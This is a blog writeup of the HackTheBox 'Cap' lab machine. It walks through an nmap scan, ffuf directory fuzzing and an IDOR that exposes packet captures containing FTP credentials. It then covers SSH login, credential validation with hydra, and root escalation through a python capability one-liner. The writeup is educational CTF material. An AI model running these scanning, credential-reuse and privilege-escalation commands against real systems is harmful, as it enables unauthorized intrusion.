---
title: "Cap"
date: 2024-12-31
draft: false
summary: "Writeup for Cap HackTheBox challenge."
tags: ["linux", "capabilities", "idor"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/cap/cover.webp"
  caption: "Cap HackTheBox Challenge"
  alt: "Cap cover"
platform: "HackTheBox"
---

**CAP** is a linux based CTF challenge on Hackthebox. This machine contains 2 flags and requires us to capture them by exploiting various vulnerabilities and misconfigurations ranging from IDOR to capabilities.
<!--more-->
To access the machine, click on the link given below:
- https://app.hackthebox.com/machines/Cap

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN cap.nmap
```

| **PORT** | **SERVICE** |
| -------- | ----------- |
| 21       | FTP         |
| 22       | SSH         |
| 80       | HTTP        |

![](https://cdn.ziomsec.com/cap/1.webp)

## Foothold

The **nmap** scan identified an **http** server running so I accessed it using my browser and got a dashboard.

![](https://cdn.ziomsec.com/cap/2.webp)

I explored the application and in the meantime, performed a scan to find directories using **ffuf**.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,302
```

![](https://cdn.ziomsec.com/cap/3.webp)

The *data* directory seemed interesting. It contained various capture files.

![](https://cdn.ziomsec.com/cap/4.webp)

```shell
ffuf -u http://TARGET/data/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200
```

![](https://cdn.ziomsec.com/cap/5.webp)
![](https://cdn.ziomsec.com/cap/6.webp)

I downloaded the packet capture files.

![](https://cdn.ziomsec.com/cap/7.webp)

![](https://cdn.ziomsec.com/cap/8.webp)

![](https://cdn.ziomsec.com/cap/9.webp)

I analyzed the files and found **ftp** credentials in *0.pcap*.

![](https://cdn.ziomsec.com/cap/10.webp)

![](https://cdn.ziomsec.com/cap/11.webp)

I used those credentials to log into the **ftp** server and found the user flag.

```shell
ftp TARGET
# enter username and password
> ls
> get user.txt
```

![](https://cdn.ziomsec.com/cap/12.webp)
![](https://cdn.ziomsec.com/cap/13.webp)

![](https://cdn.ziomsec.com/cap/14.webp)

I also validated the credentials against **ssh** using **hydra**.

```shell
hydra -l 'nathan' -p 'Buck3tH4TF0RM3!' ssh://TARGET
```

![](https://cdn.ziomsec.com/cap/15.webp)

Finally I logged in using **ssh**.

```shell
ssh nathan@TARGET
# enter password
```

![](https://cdn.ziomsec.com/cap/16.webp)

## Privilege Escalation

I viewed binaries with **capabilities** and found **python**.

```shell
getcap -r / 2>/dev/null
```

![](https://cdn.ziomsec.com/cap/17.webp)

I referred to the below article to exploit this misconfiguration and gain root access.
- https://gtfobins.github.io/gtfobins/python/#capabilities

```shell
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![](https://cdn.ziomsec.com/cap/18.webp)

## Closure

Here's a brief summary of how I pwned **CAP**:
- I performed fuzzing on the web application and discovered an endpoint contain packet capture files.
- IDOR allowed me to access other capture files aswell
- I downloaded these packet captures and analyzed them to find hardcoded FTP credentials.
- I logged into the FTP server and found the first flag.
- The FTP credentials also worked on ssh so I used it to get user access on the target.
- I enumerated binaries with capabilities and found python.
- I exploited this misconfiguration and spawned a shell as root.
- Finally, I captured the second flag from the root directory.

That's it from my side! Until next time :)

---
